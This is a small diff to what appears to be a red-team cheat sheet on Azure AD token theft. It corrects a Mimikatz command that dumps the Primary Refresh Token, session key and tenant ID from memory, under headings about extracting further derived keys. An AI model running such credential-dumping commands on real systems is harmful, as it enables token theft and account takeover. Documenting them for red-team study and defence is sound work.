@@ -26,7 +26,7 @@ dsregcmd /status
 
 #### Extract PRT, Session key (keyvalue) and Tenant ID
 ```
-Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudapp" ""exit"'
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
 ```
 
 #### Extract context key, clearkey and derived key
